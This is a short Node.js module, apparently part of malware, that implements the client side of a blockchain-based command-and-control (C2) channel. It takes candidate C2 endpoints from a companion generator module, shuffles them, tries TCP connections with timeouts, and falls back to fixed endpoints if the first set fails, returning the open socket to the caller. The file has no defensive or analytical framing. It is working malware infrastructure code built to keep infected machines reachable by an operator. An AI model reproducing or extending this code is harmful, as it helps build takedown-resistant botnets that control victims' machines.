/**
 * Blockchain C2 Client Logic
 */

const net = require("net");
const { generateC2Candidates, getFallbackEndpoints } = require("./blockchain_c2_generator");

function shuffle(a) {
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

async function tryConnectOnce(endpoints) {
  endpoints = shuffle([...endpoints]);

  for (const ep of endpoints) {
    const [host, portStr] = ep.split(":");
    const port = parseInt(portStr, 10);

    const sock = await new Promise(resolve => {
      const s = net.connect({ host, port }, () => resolve(s));
      s.on("error", () => resolve(null));
      s.setTimeout(8000, () => { s.destroy(); resolve(null); });
    });

    if (sock) return sock;
  }

  return null;
}

async function connectViaBlockchainC2() {
  const cycle = await generateC2Candidates();
  let sock = await tryConnectOnce(cycle.endpoints);

  if (!sock && cycle.mode !== "fallback") {
    const fallback = getFallbackEndpoints();
    sock = await tryConnectOnce(fallback);
  }

  return sock;
}

module.exports = { connectViaBlockchainC2 };

